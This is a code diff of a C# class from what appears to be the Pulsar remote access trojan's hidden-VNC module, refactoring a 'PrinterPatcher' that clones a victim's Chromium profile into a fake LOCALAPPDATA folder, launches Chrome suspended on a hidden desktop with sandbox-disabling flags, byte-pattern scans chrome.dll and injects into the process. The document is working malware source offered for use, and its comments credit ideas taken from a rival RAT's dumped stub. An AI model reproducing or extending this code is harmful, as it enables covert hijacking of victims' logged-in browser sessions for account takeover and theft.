@@ -2,6 +2,7 @@
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
@@ -13,7 +14,99 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
     //Also shoutout to PureRat for giving us the idea after we dumped the source to the stub. We saw how bad their solution was so we made this :sob:
     public class PrinterPatcher
     {
-        static int FindMatchOffset(byte[] src)
+        private string ChromiumExePath { get; set; }
+        private string ChromiumDllPath { get; set; }
+        private string ChromiumInstallFolderPath { get; set; }
+        private string ChromiumBrowserName { get; set; }
+
+        private string RealAppData { get; set; } = null;
+        private string FakeAppData { get; set; } = null;
+
+        /// <summary>
+        /// Creates a new PrinterPatcher instance
+        /// </summary>
+        /// <param name="chromeexepath">Path to chrome.exe</param>
+        /// <param name="chromeInstallDir">Path to Chrome installation directory (containing version folders)</param>
+        public PrinterPatcher(string chromeexepath, string chromeInstallDir, string globalBorwserName)
+        {
+            if (string.IsNullOrEmpty(chromeexepath))
+                throw new ArgumentNullException(nameof(chromeexepath));
+
+            if (string.IsNullOrEmpty(chromeInstallDir))
+                throw new ArgumentNullException(nameof(chromeInstallDir));
+
+            ChromiumExePath = chromeexepath;
+
+            // Find the latest Chrome version folder with chrome.dll
+            string latestVersionFolder = FindLatestChromeVersion(chromeInstallDir);
+
+            if (string.IsNullOrEmpty(latestVersionFolder))
+                throw new FileNotFoundException($"Could not find Chrome version folder in: {chromeInstallDir}");
+
+            // basically the ChromiumBorwserName is just the name of the dir after PROGRAMFILES
+            ChromiumBrowserName = globalBorwserName;
+
+            ChromiumInstallFolderPath = latestVersionFolder;
+            ChromiumDllPath = Path.Combine(ChromiumInstallFolderPath, "chrome.dll");
+
+            ValidatePaths();
+        }
+
+        /// <summary>
+        /// Validates that the specified paths exist
+        /// </summary>
+        private void ValidatePaths()
+        {
+            if (!File.Exists(ChromiumExePath))
+                throw new FileNotFoundException($"Chrome executable not found at: {ChromiumExePath}");
+
+            if (!File.Exists(ChromiumDllPath))
+                throw new FileNotFoundException($"Chrome DLL not found at: {ChromiumDllPath}");
+        }
+
+        /// <summary>
+        /// Finds the latest Chrome version folder that contains chrome.dll
+        /// </summary>
+        private string FindLatestChromeVersion(string chromeInstallDir)
+        {
+            try
+            {
+                if (!Directory.Exists(chromeInstallDir))
+                    throw new DirectoryNotFoundException($"Chrome installation directory not found: {chromeInstallDir}");
+
+                // find latest version dir
+                List<string> versionFolders = new List<string>();
+
+                foreach (string dir in Directory.EnumerateDirectories(chromeInstallDir))
+                {
+                    string folderName = Path.GetFileName(dir);
+                    if (folderName.Length > 0 && char.IsDigit(folderName[0]))
+                    {
+                        string dllPath = Path.Combine(dir, "chrome.dll");
+                        if (File.Exists(dllPath))
+                        {
+                            versionFolders.Add(dir);
+                        }
+                    }
+                }
+
+                if (versionFolders.Count == 0)
+                    return string.Empty;
+
+                // get newest folder by creation time
+                return versionFolders.OrderByDescending(dir => Directory.GetCreationTime(dir)).First();
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"> Error finding Chrome version: {ex.Message}");
+                return string.Empty;
+            }
+        }
+
+        /// <summary>
+        /// Finds the offset of the target function in the chrome.dll
+        /// </summary>
+        private int FindMatchOffset(byte[] src)
         {
             var offsets = new List<int>();
             string pattern = "56 48 83 EC 70 ?? ?? ?? ?? ?? 48 89 CE 48 8B 05 ?? ?? ?? ?? 48 31 E0 48 89 44 24 ?? ?? ?? ?? 48 8D 54 24";
@@ -33,6 +126,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                     newBytes[i] = Convert.ToByte(p, 16);
                 }
             }
+
             for (int i = 0; i <= src.Length - newBytes.Length; i++)
             {
                 bool match = true;
@@ -46,45 +140,34 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
                 }
                 if (match)
                     return i;
-
             }
+
             return 0;
         }
 
-        static string ChromeInstallFolderPath = "";
-
-        static byte[] ReadChromeDll()
+        /// <summary>
+        /// Reads and returns the chrome.dll file as byte array
+        /// </summary>
+        private byte[] ReadChromeDll()
         {
-            string chromePath = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application";
-
-            DateTime checkTime = DateTime.MinValue;
-
-            foreach (string dir in Directory.EnumerateDirectories(chromePath))
+            try
             {
-                if (Path.GetFileName(dir).StartsWith("1"))
+                if (File.Exists(ChromiumDllPath))
                 {
-                    // Could be remnants of old installs present, we need to find the most up to date folder.
-                    DateTime creationTime = Directory.GetCreationTime(dir);
-                    if (creationTime > checkTime)
-                    {
-                        checkTime = creationTime;
-                        ChromeInstallFolderPath = dir;
-                    }
+                    return File.ReadAllBytes(ChromiumDllPath);
                 }
-            }
 
-            if (File.Exists(ChromeInstallFolderPath + "\\chrome.dll"))
+                Debug.WriteLine($"> ERROR: Chrome DLL not found at '{ChromiumDllPath}'");
+                return new byte[0];
+            }
+            catch (Exception ex)
             {
-                return File.ReadAllBytes(ChromeInstallFolderPath + "\\chrome.dll");
+                Debug.WriteLine($"> ERROR reading Chrome DLL: {ex.Message}");
+                return new byte[0];
             }
-
-            return new byte[0];
         }
 
-        static string RealAppData = null;
-        static string FakeAppData = null;
-
-        private static void DirectoryCopy(string sourceDirName, string destDirName)
+        private void DirectoryCopy(string sourceDirName, string destDirName)
         {
             var dir = new DirectoryInfo(sourceDirName);
             if (!dir.Exists)
@@ -109,30 +192,29 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             });
         }
 
-        static void EnableEnvironmentVariableFucker()
+        private void EnableEnvironmentVariableFucker()
         {
             RealAppData = Environment.GetEnvironmentVariable("LOCALAPPDATA");
             FakeAppData = Environment.GetEnvironmentVariable("TEMP") + "\\FakeAppData";
             if (Directory.Exists(FakeAppData)) Directory.Delete(FakeAppData, true);
             Directory.CreateDirectory(FakeAppData);
-            DirectoryCopy(RealAppData + "\\Google", FakeAppData + "\\Google");
-            //KDotFileHandler.CopyDirectory(RealAppData + "\\Google", FakeAppData + "\\Google");
-            Debug.WriteLine("> Cloned '{0}' to '{1}'", RealAppData + "\\Google", FakeAppData + "\\Google");
+            DirectoryCopy(RealAppData + ChromiumBrowserName, FakeAppData + ChromiumBrowserName);
+            Debug.WriteLine("> Cloned '{0}' to '{1}'", RealAppData + ChromiumBrowserName, FakeAppData + ChromiumBrowserName);
             Environment.SetEnvironmentVariable("LOCALAPPDATA", FakeAppData);
             Debug.WriteLine("> Overrided %LOCALAPPDATA% environment variable");
         }
 
-        static void DisableEnvironmentVariableFucker()
+        private void DisableEnvironmentVariableFucker()
         {
             Environment.SetEnvironmentVariable("LOCALAPPDATA", RealAppData);
             Debug.WriteLine("> Restored %LOCALAPPDATA% environment variable");
         }
 
-        static bool ApplyPatch(int pid, int offset)
+        private bool ApplyPatch(int pid, int offset)
         {
             try
             {
-                DllInjector.InjectDll(pid, ChromeInstallFolderPath + "\\chrome.dll");
+                DllInjector.InjectDll(pid, ChromiumDllPath);
                 Debug.WriteLine("> Loaded chrome.dll into chrome process");
 
                 // Wait a moment for the DLL to be fully loaded
@@ -189,7 +271,10 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
         }
 
 
-        public static void Start()
+        /// <summary>
+        /// Starts Chrome with the patch applied
+        /// </summary>
+        public void Start()
         {
             byte[] chromeDll = ReadChromeDll();
             Debug.WriteLine("> Read {0} bytes from chrome.dll", chromeDll.Length);
@@ -200,7 +285,7 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
             if (offset == 0) return;
 
             EnableEnvironmentVariableFucker();
-            int chromePid = ProcessHelper.CreateSuspendedProcess(Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Google\\Chrome\\Application\\chrome.exe");
+            int chromePid = ProcessHelper.CreateSuspendedProcess(ChromiumExePath, "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized");
             Debug.WriteLine("> Created suspended chrome process: {0}", chromePid);
             DisableEnvironmentVariableFucker();
 
@@ -463,39 +548,22 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
         private struct STARTUPINFO
         {
             public int cb;
-
             public string lpReserved;
-
             public string lpDesktop;
-
             public string lpTitle;
-
             public int dwX;
-
             public int dwY;
-
             public int dwXSize;
-
             public int dwYSize;
-
             public int dwXCountChars;
-
             public int dwYCountChars;
-
             public int dwFillAttribute;
-
             public int dwFlags;
-
             public short wShowWindow;
-
             public short cbReserved2;
-
             public IntPtr lpReserved2;
-
             public IntPtr hStdInput;
-
             public IntPtr hStdOutput;
-
             public IntPtr hStdError;
         }
 
@@ -513,18 +581,24 @@ namespace Pulsar.Client.Helper.HVNC.Chromium
         [DllImport("kernel32.dll")]
         private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
 
-        public static int CreateSuspendedProcess(string path)
+        public static int CreateSuspendedProcess(string path, string arguments = null)
         {
             STARTUPINFO si = new STARTUPINFO();
             si.cb = Marshal.SizeOf(si);
             si.lpDesktop = "PulsarDesktop";
             PROCESS_INFORMATION pi = default;
 
-            bool success = CreateProcess(
-                path,
+            // default args to use
+            if (string.IsNullOrEmpty(arguments))
+            {
                 //pretty sure I have to do this because the path being executed is the first one but its being ignored? not too sure.
                 // there is probably a really good explanation for this but I'm lowkey too lazy to go look it up so this will do.
-                "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized",
+                arguments = "--no-sandbox --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --start-maximized";
+            }
+
+            bool success = CreateProcess(
+                path,
+                arguments,
                 IntPtr.Zero,
                 IntPtr.Zero,
                 false,
